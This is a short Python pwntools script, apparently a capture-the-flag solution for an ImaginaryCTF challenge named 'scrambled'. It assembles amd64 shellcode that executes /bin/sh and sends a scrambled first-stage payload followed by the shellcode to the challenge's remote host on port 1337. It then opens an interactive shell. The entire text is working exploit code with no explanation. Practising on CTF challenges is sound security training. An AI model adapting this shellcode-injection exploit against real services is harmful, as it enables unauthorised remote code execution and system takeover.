from pwn import *

context.arch = "amd64"
shellcode = """
nop
nop
nop
nop
nop
nop
nop
nop
nop
add rsi, 0xf
jmp rsi
nop
mov al, 0x3b
mov dl, 0x0
mov rdi, rsi
xor rsi, rsi
add rdi, 0x20
syscall
"""
shellcode = asm(shellcode) + b"/bin/sh\x00"
r = remote("scrambled.chal.imaginaryctf.org" ,1337)
#r = process("./vuln")
scrambled_shellcode = b"\x90BC0E\xffG\x05\x90JK\xff\xd2N1P\xb2R1TUVWXY\xd6\x90HcHHdfg\x89i\xe6k\x0fm"
r.sendafter('Send your code:',scrambled_shellcode)
log.info("Wait for 5 secs")
sleep(5)
r.send(shellcode)
log.info("popping the shell")
r.interactive()
